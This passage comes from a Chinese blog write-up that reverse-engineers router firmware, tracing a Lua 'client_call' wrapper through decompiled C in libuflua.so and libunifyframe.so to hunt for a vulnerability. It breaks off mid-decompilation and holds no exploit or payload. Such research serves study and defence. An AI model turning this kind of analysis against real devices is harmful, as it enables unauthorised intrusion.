class="keyword">if</span> back <span class="keyword">and</span> back == <span class="string">&quot;1&quot;</span> <span class="keyword">then</span></span><br><span class="line">    back = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    back = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">end</span>   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> not_change_configId <span class="keyword">then</span></span><br><span class="line">    not_change_configId = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    not_change_configId = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> multi <span class="keyword">then</span></span><br><span class="line">    multi = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    multi = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> stat = uf_call.client_call(ctype, cmd, <span class="built_in">module</span>, param, back, ip, password, force, not_change_configId, multi)</span><br><span class="line">    <span class="keyword">return</span> stat</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>可以看到其调用了libuflua的client_call函数</p><p>首先再libuflua.so中直接看是找不到client_call函数的，可能是因为该函数名称被识别为了代码段，因此放入010editor中，搜索字符串client_call，找到0xFF0位置，按A，</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOAD:00000FF0 63 6C 69 65 6E 74 5F 63 61 6C+aClientCall:.ascii &quot;client_call&quot;&lt;0&gt;      <span class="comment"># DATA XREF: LOAD:off_1101C↓o</span></span><br></pre></td></tr></table></figure><p>寻找交叉调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">luaopen_libuflua</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  luaL_register(a1, <span class="string">&quot;libuflua&quot;</span>, &amp;off_1101C);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数使用了<code>__fastcall</code> 调用约定，在这种约定下，函数的前两个整数参数通过寄存器传递，其中luaL_register是一个Lua C API 函数，用于将 C 函数注册到 Lua 中。它通常用于将一组 C 函数注册为一个 Lua 库。</p><p><code>luaL_register</code> 函数将 <code>off_1101C</code> 指向的函数库表注册到 Lua 中，并将其命名为 <code>libuflua</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_A00</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v13[<span class="number">3</span>]; <span class="comment">// [sp+18h] [-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v13[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0x34</span>);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v2, <span class="number">0</span>, <span class="number">52</span>);</span><br><span class="line">    v5 = <span class="number">4</span>;</span><br><span class="line">    *(_DWORD *)v3 = luaL_checkinteger(a1, <span class="number">1</span>);</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">4</span>) = luaL_checklstring(a1, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    v6 = luaL_checklstring(a1, <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">    v7 = *(_DWORD *)v3;</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">8</span>) = v6;</span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(v3 + <span class="number">12</span>) = lua_tolstring(a1, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">41</span>) = lua_toboolean(a1, <span class="number">5</span>) == <span class="number">1</span>;</span><br><span class="line">      v5 = <span class="number">6</span>;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">40</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">20</span>) = lua_tolstring(a1, v5, <span class="number">0</span>);</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">24</span>) = lua_tolstring(a1, v5 + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    v8 = v5 + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)v3 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = v5 + <span class="number">3</span>;</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">43</span>) = lua_toboolean(a1, v5 + <span class="number">2</span>) == <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">43</span>) = lua_toboolean(a1, v5 + <span class="number">2</span>) == <span class="number">1</span>;</span><br><span class="line">      v8 = v5 + <span class="number">4</span>;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">44</span>) = lua_toboolean(a1, v5 + <span class="number">3</span>) == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(v3 + <span class="number">48</span>) = lua_toboolean(a1, v8) == <span class="number">1</span>;</span><br><span class="line">    v4 = uf_client_call(v3, v13, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v13[<span class="number">0</span>] = strdup(<span class="string">&quot;memory full!&quot;</span>);</span><br><span class="line">    v4 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  lua_createtable(a1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  lua_pushstring(a1, <span class="string">&quot;code&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    lua_pushnumber(a1, v9, loc_1000, loc_1004);</span><br><span class="line">    lua_rawset(a1, <span class="number">-3</span>);</span><br><span class="line">    lua_pushstring(a1, <span class="string">&quot;err&quot;</span>);</span><br><span class="line">    lua_pushstring(a1, v13[<span class="number">0</span>]);</span><br><span class="line">    lua_rawset(a1, <span class="number">-3</span>);</span><br><span class="line">    lua_pushstring(a1, <span class="string">&quot;data&quot;</span>);</span><br><span class="line">    v10 = a1;</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    lua_pushnumber(a1, v9, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    lua_rawset(a1, <span class="number">-3</span>);</span><br><span class="line">    lua_pushstring(a1, <span class="string">&quot;err&quot;</span>);</span><br><span class="line">    lua_pushstring(a1, <span class="number">0</span>);</span><br><span class="line">    lua_rawset(a1, <span class="number">-3</span>);</span><br><span class="line">    lua_pushstring(a1, <span class="string">&quot;data&quot;</span>);</span><br><span class="line">    v11 = v13[<span class="number">0</span>];</span><br><span class="line">    v10 = a1;</span><br><span class="line">  &#125;</span><br><span class="line">  lua_pushstring(v10, v11);</span><br><span class="line">  lua_rawset(a1, <span class="number">-3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v13[<span class="number">0</span>] )</span><br><span class="line">    <span class="built_in">free</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了能顺利分析这个C函数，我们要先了解Lua栈是什么</p><blockquote><p>Lua 栈是 Lua 虚拟机用来管理函数调用和数据传递的一个重要结构。它是一个后进先出（LIFO）的数据结构，专门用于在 C 和 Lua 之间传递数据。每个 Lua 状态机（<code>lua_State</code>）都有自己的栈，用于存储函数参数、返回值和临时变量。</p><ol><li><strong>压栈操作</strong>:<ul><li><code>lua_pushnumber(lua_State* L, lua_Number n)</code>: 将一个数字压入栈中。</li><li><code>lua_pushstring(lua_State* L, const char* s)</code>: 将一个字符串压入栈中。</li><li><code>lua_pushboolean(lua_State* L, int b)</code>: 将一个布尔值压入栈中。</li><li><code>lua_pushnil(lua_State* L)</code>: 将一个 nil 压入栈中。</li></ul></li><li><strong>弹栈操作</strong>:<ul><li><code>lua_tonumber(lua_State* L, int index)</code>: 将栈上指定索引处的值转换为数字。</li><li><code>lua_tostring(lua_State* L, int index)</code>: 将栈上指定索引处的值转换为字符串。</li><li><code>lua_toboolean(lua_State* L, int index)</code>: 将栈上指定索引处的值转换为布尔值。</li></ul></li><li><strong>栈操作</strong>:<ul><li><code>lua_settop(lua_State* L, int index)</code>: 设置栈顶索引。</li><li><code>lua_gettop(lua_State* L)</code>: 获取栈顶索引。</li><li><code>lua_remove(lua_State* L, int index)</code>: 移除栈上指定索引处的值。</li></ul></li><li><strong>表操作</strong>:<ul><li><code>lua_createtable(lua_State* L, int narr, int nrec)</code>: 创建一个新的表并压入栈中。</li><li><code>lua_settable(lua_State* L, int index)</code>: 将栈顶的值弹出并存储在表中。</li><li><code>lua_gettable(lua_State* L, int index)</code>: 获取表中的值并压入栈中。</li></ul></li></ol></blockquote><p>但是可以直接理解为调用了<code>v4 = uf_client_call(v3, v13, 0);</code>uf_client_call函数，因为本函数明显没有显示的漏洞点，因此就先跟进然后再返回来找</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405300037160.png" alt="image-20240527003055624"></p><p>从这里跟平时的C库是一样的，说明这个函数是一个外部库定义的函数</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405300037161.png" alt="image-20240527003258125"></p><p>搜索到显然是libunifyframe.so库</p><h2 id="二进制文件分析"><a href="#二进制文件分析" class="headerlink" title="二进制文件分析"></a>二进制文件分析</h2><p>在分析之前附上zikh26师傅画的调用栈</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405300037162.png" alt="image-20240529225726519"></p><h3 id="uf-client-call"><a href="#uf-client-call" class="headerlink" title="uf_client_call"></a>uf_client_call</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">uf_client_call</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v12; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v30; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v36; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v38; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v39; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v40; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> v41; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v42; <span class="comment">// $t0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v43; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v44; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v45; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v46; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> *v47; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v48; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v49; <span class="comment">// $s7</span></span><br><span class="line">  <span class="type">int</span> v50; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">int</span> v51; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v52; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">char</span> v53[<span class="number">128</span>]; <span class="comment">// [sp+30h] [-90h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v54; <span class="comment">// [sp+B0h] [-10h]</span></span><br><span class="line">  <span class="type">int</span> v55; <span class="comment">// [sp+B4h] [-Ch]</span></span><br><span class="line">  <span class="type">int</span> v56; <span class="comment">// [sp+B8h] [-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v55 = <span class="number">0</span>;</span><br><span class="line">    v54 = <span class="number">38</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  getpid();</span><br><span class="line">  <span class="keyword">if</span> ( !*(_DWORD *)(a1 + <span class="number">4</span>) || !*(_DWORD *)(a1 + <span class="number">8</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)cmd or module is null&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = json_object_new_object();</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)json_object_new_object failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = *(_DWORD *)(a1 + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( *(_DWORD *)a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      v14 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">10</span>;</span><br><span class="line">      v8 = <span class="built_in">calloc</span>(v14, <span class="number">1</span>);</span><br><span class="line">      v9 = <span class="number">453</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">      v10 = v8;</span><br><span class="line">      v11 = v14;</span><br><span class="line">      v12 = <span class="string">&quot;acConfig.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      v13 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">11</span>;</span><br><span class="line">      v8 = <span class="built_in">calloc</span>(v13, <span class="number">1</span>);</span><br><span class="line">      v9 = <span class="number">443</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">      v10 = v8;</span><br><span class="line">      v11 = v13;</span><br><span class="line">      v12 = <span class="string">&quot;devConfig.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      v7 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">8</span>;</span><br><span class="line">      v8 = <span class="built_in">calloc</span>(v7, <span class="number">1</span>);</span><br><span class="line">      v9 = <span 